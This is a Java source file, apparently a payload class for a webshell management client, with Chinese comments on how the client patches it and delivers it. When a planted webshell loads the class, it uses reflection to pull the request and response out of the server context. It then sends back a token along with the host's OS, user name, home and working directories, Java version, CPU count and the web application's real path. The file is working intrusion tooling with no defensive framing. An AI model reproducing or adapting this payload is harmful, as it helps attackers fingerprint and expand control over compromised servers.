// 探测载荷：令牌回显 + 目标侧基本信息。
// 约束：默认包（类名即文件名）、零 servlet 依赖（全反射取上下文）、无嵌套/匿名类
//（单 class 文件交付）、static final String 占位值各不相同（客户端常量池补丁按字段定位，
// 共享池项会串值）。占位值被发送时替换为实参。
public class WsmProbe {

	public static final String t = "WSMP-T0"; // 探测令牌

	public boolean equals(Object ctx) {
		try {
			Object resp = respOf(ctx);
			Object req = reqOf(ctx);
			StringBuilder sb = new StringBuilder("WSM1");
			sb.append("|").append(t);
			sb.append("|").append(System.getProperty("os.name", "?").replace(' ', '_'));
			sb.append("|").append(System.getProperty("user.name", "?"));
			sb.append("|").append(System.getProperty("user.home", "?"));
			sb.append("|").append(System.getProperty("user.dir", "?"));
			sb.append("|").append(System.getProperty("java.version", "?"));
			sb.append("|").append(Runtime.getRuntime().availableProcessors());
			sb.append("|").append(realPathOf(req));
			write(resp, sb.toString());
		} catch (Throwable e) {
			try { write(respOf(ctx), "!ERR " + e); } catch (Throwable ignored) {}
		}
		return true;
	}

	static Object reqOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) {
			Object[] a = (Object[]) ctx;
			return a.length > 0 ? a[0] : null;
		}
		try { return ctx.getClass().getMethod("getRequest").invoke(ctx); } catch (Throwable ignored) {}
		return ctx;
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) {
			Object[] a = (Object[]) ctx;
			return a.length > 1 ? a[1] : null;
		}
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static String realPathOf(Object req) {
		try {
			Object sc = req.getClass().getMethod("getServletContext").invoke(req);
			Object rp = sc.getClass().getMethod("getRealPath", String.class).invoke(sc, "");
			return rp == null ? "" : String.valueOf(rp);
		} catch (Throwable ignored) {
			return "";
		}
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
